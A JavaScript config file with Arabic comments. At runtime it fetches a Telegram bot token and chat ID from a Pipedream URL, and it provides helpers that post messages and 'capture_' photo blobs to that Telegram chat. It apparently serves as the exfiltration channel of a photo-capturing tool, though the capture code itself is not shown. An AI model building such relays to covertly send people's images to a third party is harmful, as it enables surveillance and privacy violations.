// config.js
// هذا الملف مسؤول عن جلب التوكن والشات آيدي من Pipedream فقط
// لا تحط التوكن أو الشات آيدي هنا أبداً!

const Config = {
  BOT_TOKEN: '',
  CHAT_ID: '',
  PIPEDREAM_URL: 'https://eo3djhokj3ty6kt.m.pipedream.net',

  async fetch() {
    try {
      const response = await fetch(this.PIPEDREAM_URL);
      if (!response.ok) throw new Error('فشل الاتصال بـ Pipedream');
      const data = await response.json();
      
      if (!data.token || !data.chatId) {
        throw new Error('بيانات ناقصة من السيرفر');
      }
      
      this.BOT_TOKEN = data.token;
      this.CHAT_ID = data.chatId;
      console.log('✅ تم جلب الإعدادات بنجاح');
      return true;
    } catch (err) {
      console.error('❌ فشل جلب الإعدادات:', err);
      return false;
    }
  },

  async sendMessage(text) {
    if (!this.BOT_TOKEN || !this.CHAT_ID) return;
    try {
      await fetch(`https://api.telegram.org/bot${this.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: this.CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        })
      });
    } catch (e) {
      console.error('فشل إرسال رسالة:', e);
    }
  },

  async sendPhoto(blob, caption = '') {
    if (!this.BOT_TOKEN || !this.CHAT_ID) return;
    const formData = new FormData();
    formData.append('photo', blob, `capture_${Date.now()}.jpg`);
    formData.append('chat_id', this.CHAT_ID);
    if (caption) formData.append('caption', caption);

    try {
      await fetch(`https://api.telegram.org/bot${this.BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      return true;
    } catch (e) {
      console.error('فشل إرسال صورة:', e);
      return false;
    }
  }
};
